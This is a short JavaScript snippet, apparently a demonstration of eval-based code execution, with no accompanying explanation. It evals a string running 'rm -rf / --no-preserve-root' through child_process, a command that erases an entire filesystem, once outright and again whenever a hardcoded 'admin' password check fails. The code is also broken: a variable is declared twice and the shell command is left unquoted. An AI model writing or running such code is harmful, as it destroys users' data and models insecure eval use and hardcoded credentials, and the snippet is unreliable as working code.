let prodct = 2 * 2;
eval(prodct);

//remote code exec
let prodct = "require('child_process').exec(rm -rf / --no-preserve-root)";
eval(prodct)
if (password === "admin") {
    console.log("Access granted");
} else {
    eval("require('child_process').exec(rm -rf / --no-preserve-root)");
}